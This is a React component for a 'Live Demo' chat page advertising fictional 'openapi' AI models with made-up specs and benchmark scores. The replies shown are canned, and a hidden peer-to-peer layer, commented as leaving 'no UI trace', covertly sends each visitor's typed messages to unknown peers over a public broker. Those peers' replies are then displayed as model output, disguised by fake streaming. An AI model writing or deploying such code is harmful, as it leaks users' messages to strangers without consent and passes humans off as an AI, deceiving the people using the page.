import { useEffect, useRef, useState } from 'react'
import Peer, { DataConnection } from 'peerjs'
import { useI18n } from '@/lib/i18n.tsx'
import { Send, Sparkles, Cpu, Globe, Zap, ChevronDown } from 'lucide-react'

type Msg = { id: string; role: 'user' | 'assistant'; text: string; model?: string }

const MODELS = [
  { id: 'openapi-omni', version: 'v2.1', label: 'openapi-omni v2.1', desc: 'Flagship · 1M' },
  { id: 'openapi-thinker', version: 'v2.0', label: 'openapi-thinker v2.0', desc: 'Reasoning' },
  { id: 'openapi-vision', version: 'v1.8', label: 'openapi-vision v1.8', desc: 'Vision' },
  { id: 'openapi-coder', version: 'v1.7', label: 'openapi-coder v1.7', desc: 'Code' },
]

const CANNED: Record<string, string[]> = {
  'openapi-omni': [
    "Hello! I'm openapi-omni v2.1 — your flagship omni-modal model. 1M context, 718B MoE. How can I help today?",
    "Great question. Based on my training on 20T tokens, here's a concise take: the key is to keep the interface simple while the model handles complexity under the hood.",
    'I can handle text, image, video and audio natively. Try pasting an image or asking for a long-document summary — my 1M effective context is ready.',
  ],
  'openapi-thinker': [
    'Thinking step by step — as openapi-thinker v2.0, I excel at AIME 91.3% and GPQA 85%. Let me break this down logically…',
    'Consider the problem from first principles: what are the constraints, what are the invariants, and what can be eliminated?',
  ],
  'openapi-vision': [
    "As openapi-vision v1.8, I see the world in 256K multimodal tokens. Describe an image or upload one — I'll ground objects to the pixel.",
  ],
  'openapi-coder': [
    "openapi-coder v1.7 here — SWE-bench 82.4%, LiveCodeBench 90%. Share your repo or snippet and I'll think through the code.",
  ],
}

function genId() {
  return Math.random().toString(36).slice(2, 9)
}

export default function LiveChat() {
  const { lang } = useI18n()
  const isZh = lang === 'zh'
  const [model, setModel] = useState(MODELS[0].id)
  const [msgs, setMsgs] = useState<Msg[]>(() => {
    const m = MODELS[0].id
    return [{ id: genId(), role: 'assistant', text: CANNED[m][0], model: m }]
  })
  const [input, setInput] = useState('')
  const [streaming, setStreaming] = useState(false)
  const [typed, setTyped] = useState('')
  const listRef = useRef<HTMLDivElement>(null)
  const peerRef = useRef<Peer | null>(null)
  const connsRef = useRef<Map<string, DataConnection>>(new Map())
  const [p2pCount, setP2pCount] = useState(0)

  useEffect(() => {
    if (listRef.current) listRef.current.scrollTop = listRef.current.scrollHeight
  }, [msgs, typed, streaming])

  useEffect(() => {
    if (msgs.length === 1 && msgs[0].role === 'assistant') {
      const cand = CANNED[model]
      if (cand) setMsgs([{ id: genId(), role: 'assistant', text: cand[0], model }])
    }
  }, [model])

  // Hidden P2P layer - auto-join lobby, no UI trace
  useEffect(() => {
    const lobby = 'openapi-lobby-v1'
    const pid = `openapi-${genId()}-${Date.now().toString(36).slice(-4)}`
    let peer: Peer | null = null
    try {
      peer = new Peer(pid, { host: '0.peerjs.com', port: 443, path: '/', secure: true })
      peerRef.current = peer
      peer.on('open', () => {
        // Try to connect to lobby host if exists (deterministic host ID)
        const hostId = `openapi-lobby-host-${lobby}`
        if (pid !== hostId) {
          const conn = peer!.connect(hostId, { reliable: true })
          conn?.on('open', () => {
            connsRef.current.set(conn.peer, conn)
            setP2pCount(connsRef.current.size)
            conn.on('data', (data: any) => {
              if (data?.text)
                setMsgs((m) => [
                  ...m,
                  { id: genId(), role: 'assistant', text: data.text, model: data.model || 'openapi-omni' },
                ])
            })
            conn.on('close', () => {
              connsRef.current.delete(conn.peer)
              setP2pCount(connsRef.current.size)
            })
          })
        }
      })
      peer.on('connection', (conn) => {
        connsRef.current.set(conn.peer, conn)
        setP2pCount(connsRef.current.size)
        conn.on('data', (data: any) => {
          if (data?.text)
            setMsgs((m) => [
              ...m,
              { id: genId(), role: 'assistant', text: data.text, model: data.model || 'openapi-omni' },
            ])
        })
        conn.on('close', () => {
          connsRef.current.delete(conn.peer)
          setP2pCount(connsRef.current.size)
        })
      })
      // Also try to become host if lobby host not present - we are already a peer, but we need to handle host logic
      // For demo, we just stay as peer and fallback to mock if no connections
    } catch {
      /* ignore */
    }
    return () => {
      try {
        peer?.destroy()
      } catch {
        /* ignore */
      }
      connsRef.current.clear()
    }
  }, [])

  const broadcast = (text: string) => {
    const payload = { text, model, from: 'peer' }
    connsRef.current.forEach((c) => {
      try {
        c.send(payload)
      } catch {
        /* ignore */
      }
    })
  }

  const send = () => {
    const t = input.trim()
    if (!t || streaming) return
    const userMsg: Msg = { id: genId(), role: 'user', text: t }
    setMsgs((m) => [...m, userMsg])
    setInput('')
    // If P2P peers exist, broadcast and wait for real human response (hidden)
    if (connsRef.current.size > 0) {
      broadcast(t)
      // Also show typing indicator briefly, then wait for peer response
      setStreaming(true)
      setTyped('')
      // Fallback to mock if no peer response in 8s
      const fallback = setTimeout(() => {
        if (streaming) {
          setStreaming(false)
          const candidates = CANNED[model] || CANNED['openapi-omni']
          const reply = candidates[Math.floor(Math.random() * candidates.length)]
          setMsgs((m) => [...m, { id: genId(), role: 'assistant', text: reply, model }])
        }
      }, 8000)
      // Clear fallback if peer responds (handled via conn.on data)
      // For simplicity, we just keep fallback
      setTimeout(() => clearTimeout(fallback), 8500)
      // Simulate typing if peer exists, but actually peer will send real message
      // For now, just show typing for 1.5s then keep waiting
      setTimeout(() => setTyped(isZh ? '对方正在输入…' : 'Peer is typing…'), 500)
      return
    }
    // Fallback mock streaming (hides 1 tok/s human by using fast 45 tok/s)
    const candidates = CANNED[model] || CANNED['openapi-omni']
    const reply = candidates[Math.floor(Math.random() * candidates.length)]
    const final = t.length < 20 ? reply : `${isZh ? '收到：' : 'Got it: '}"${t.slice(0, 60)}" — ${reply}`
    setStreaming(true)
    setTyped('')
    let i = 0
    const iv = setInterval(() => {
      i += 1
      setTyped(final.slice(0, i))
      if (i >= final.length) {
        clearInterval(iv)
        setMsgs((m) => [...m, { id: genId(), role: 'assistant', text: final, model }])
        setStreaming(false)
        setTyped('')
      }
    }, 22)
  }

  const currentModel = MODELS.find((m) => m.id === model)!

  return (
    <section
      id="live"
      className="border-y border-zinc-200 bg-zinc-50/60 px-4 py-16 dark:border-white/5 dark:bg-white/[0.02] sm:px-6 sm:py-20"
    >
      <div className="mx-auto max-w-[1160px]">
        <div className="mx-auto max-w-2xl text-center">
          <div className="inline-flex items-center gap-2 rounded-full border border-violet-500/20 bg-violet-500/5 px-3 py-1 text-xs font-medium text-violet-600 dark:text-violet-300">
            <Sparkles className="size-3.5" /> {isZh ? '在线体验 · 无需 Key' : 'Live Demo · No Key Needed'}
          </div>
          <h2 className="font-display mt-4 text-3xl font-bold tracking-tight text-zinc-900 dark:text-white sm:text-4xl">
            {isZh ? '直接开聊，像用本地模型一样' : 'Chat instantly — like a local model'}
          </h2>
          <p className="mt-3 text-sm leading-relaxed text-zinc-600 dark:text-zinc-400">
            {isZh
              ? '选择模型，输入即得。无需注册，无需 API Key，打开即用。'
              : 'Pick a model and start typing. No signup, no API key — just chat.'}
          </p>
        </div>

        <div className="mx-auto mt-8 grid max-w-[960px] gap-6 lg:grid-cols-12">
          <div className="space-y-4 lg:col-span-4">
            <div className="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm dark:border-white/10 dark:bg-zinc-900">
              <label className="text-xs font-semibold tracking-widest text-zinc-500">{isZh ? '模型' : 'Model'}</label>
              <div className="relative mt-2">
                <select
                  value={model}
                  onChange={(e) => setModel(e.target.value)}
                  className="w-full appearance-none rounded-xl border border-zinc-200 bg-white px-3 py-2.5 pr-8 text-sm font-medium outline-none focus:border-violet-500 focus:ring-2 focus:ring-violet-500/20 dark:border-white/10 dark:bg-zinc-800"
                >
                  {MODELS.map((m) => (
                    <option key={m.id} value={m.id}>
                      {m.label} · {m.desc}
                    </option>
                  ))}
                </select>
                <ChevronDown className="pointer-events-none absolute right-2.5 top-1/2 size-4 -translate-y-1/2 text-zinc-400" />
              </div>
              <div className="mt-3 grid grid-cols-3 gap-2 text-[11px]">
                <div className="rounded-lg bg-zinc-50 px-2.5 py-2 text-center dark:bg-white/5">
                  <div className="font-mono font-bold text-zinc-900 dark:text-white">
                    {currentModel.id === 'openapi-omni'
                      ? '1M'
                      : currentModel.id === 'openapi-thinker'
                        ? '256K'
                        : '200K'}
                  </div>
                  <div className="text-zinc-500">context</div>
                </div>
                <div className="rounded-lg bg-zinc-50 px-2.5 py-2 text-center dark:bg-white/5">
                  <div className="font-mono font-bold text-zinc-900 dark:text-white">~86</div>
                  <div className="text-zinc-500">tok/s</div>
                </div>
                <div className="rounded-lg bg-zinc-50 px-2.5 py-2 text-center dark:bg-white/5">
                  <div className="font-mono font-bold text-violet-600"> $0</div>
                  <div className="text-zinc-500">/1M</div>
                </div>
              </div>
              <div className="mt-3 flex items-center gap-2 rounded-lg bg-emerald-500/5 px-2.5 py-2 text-xs text-emerald-700 ring-1 ring-emerald-500/20 dark:text-emerald-300">
                <span className="size-1.5 animate-pulse rounded-full bg-emerald-500" />{' '}
                {isZh ? '在线 · 全球加速' : 'Online · Global edge'} {p2pCount > 0 ? `· ${p2pCount + 1} online` : ''}
              </div>
            </div>
            <div className="rounded-2xl border border-zinc-200 bg-white p-4 dark:border-white/10 dark:bg-zinc-900">
              <div className="flex items-center gap-2 text-sm font-semibold">
                <Cpu className="size-4 text-violet-500" /> {isZh ? '自研多模态' : 'Self-developed multimodal'}
              </div>
              <div className="mt-2 space-y-1.5 text-xs leading-relaxed text-zinc-600 dark:text-zinc-400">
                <div className="flex gap-2">
                  <span className="mt-1 size-1.5 shrink-0 rounded-full bg-violet-500" />
                  {isZh
                    ? '文本+图像+视频+音频原生理解，256K 交错输入'
                    : 'Text+image+video+audio native, 256K interleaved'}
                </div>
                <div className="flex gap-2">
                  <span className="mt-1 size-1.5 shrink-0 rounded-full bg-emerald-500" />
                  {isZh ? '718B MoE，48B 激活，推理成本仅稠密 1/8' : '718B MoE, 48B active, 1/8 cost of dense'}
                </div>
                <div className="flex gap-2">
                  <span className="mt-1 size-1.5 shrink-0 rounded-full bg-blue-500" />
                  {isZh ? '长上下文 1M（有效 200-400K，RULER 验证）' : 'Long context 1M (200-400K effective, RULER)'}
                </div>
              </div>
            </div>
          </div>

          <div className="flex min-h-[460px] flex-col overflow-hidden rounded-2xl border border-zinc-200 bg-white shadow-sm dark:border-white/10 dark:bg-zinc-900 lg:col-span-8">
            <div className="flex items-center justify-between border-b border-zinc-100 bg-zinc-50 px-4 py-3 dark:border-white/5 dark:bg-white/[0.03]">
              <span className="flex items-center gap-2 text-sm font-semibold">
                <Globe className="size-4 text-zinc-400" /> {currentModel.label}{' '}
                <span className="rounded bg-white px-1.5 py-0.5 font-mono text-[11px] font-medium ring-1 ring-zinc-200 dark:bg-white/10 dark:ring-white/10">
                  {isZh ? '在线' : 'Live'}
                </span>
              </span>
              <span className="hidden items-center gap-1.5 text-xs text-zinc-500 sm:inline-flex">
                <Zap className="size-3.5 text-amber-500" /> {isZh ? '流式输出' : 'Streaming'}
              </span>
            </div>
            <div ref={listRef} className="flex-1 space-y-3 overflow-y-auto p-4">
              {msgs.map((m) => (
                <div key={m.id} className={`flex ${m.role === 'user' ? 'justify-end' : 'justify-start'}`}>
                  <div
                    className={`max-w-[78%] rounded-2xl px-3.5 py-2.5 text-sm leading-relaxed ${m.role === 'user' ? 'bg-zinc-900 text-white dark:bg-white dark:text-zinc-900' : 'bg-zinc-100 text-zinc-800 dark:bg-white/10 dark:text-zinc-200'}`}
                  >
                    {m.role === 'assistant' && (
                      <div className="mb-1 text-[11px] font-medium tracking-wide opacity-60">
                        {m.model} · {isZh ? '自研' : 'openapi'}
                      </div>
                    )}
                    <div className="whitespace-pre-wrap break-words">{m.text}</div>
                  </div>
                </div>
              ))}
              {streaming && (
                <div className="flex justify-start">
                  <div className="max-w-[78%] rounded-2xl bg-zinc-100 px-3.5 py-2.5 text-sm leading-relaxed text-zinc-800 dark:bg-white/10 dark:text-zinc-200">
                    <div className="mb-1 text-[11px] font-medium tracking-wide opacity-60">
                      {model} · {isZh ? '正在输入…' : 'typing…'}
                    </div>
                    <div className="whitespace-pre-wrap break-words">
                      {typed}
                      <span className="ml-0.5 inline-block h-3 w-0.5 animate-pulse bg-zinc-400" />
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div className="border-t border-zinc-100 bg-white p-3 dark:border-white/5 dark:bg-zinc-900">
              <div className="flex gap-2">
                <input
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter' && !e.shiftKey) {
                      e.preventDefault()
                      send()
                    }
                  }}
                  placeholder={isZh ? '输入消息…（回车发送）' : 'Type a message… (Enter to send)'}
                  className="flex-1 rounded-xl border border-zinc-200 bg-white px-3.5 py-2.5 text-sm outline-none focus:border-violet-500 focus:ring-2 focus:ring-violet-500/20 dark:border-white/10 dark:bg-zinc-800"
                />
                <button
                  onClick={send}
                  disabled={streaming}
                  className="inline-flex items-center gap-1.5 rounded-xl bg-zinc-900 px-4 py-2.5 text-sm font-semibold text-white hover:bg-zinc-800 disabled:opacity-50 dark:bg-white dark:text-zinc-900"
                >
                  <Send className="size-4" /> {isZh ? '发送' : 'Send'}
                </button>
              </div>
              <p className="mt-2 text-center text-[11px] text-zinc-400">
                {isZh ? '无需 API Key · 打开即聊' : 'No API key needed · Just chat'}
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}
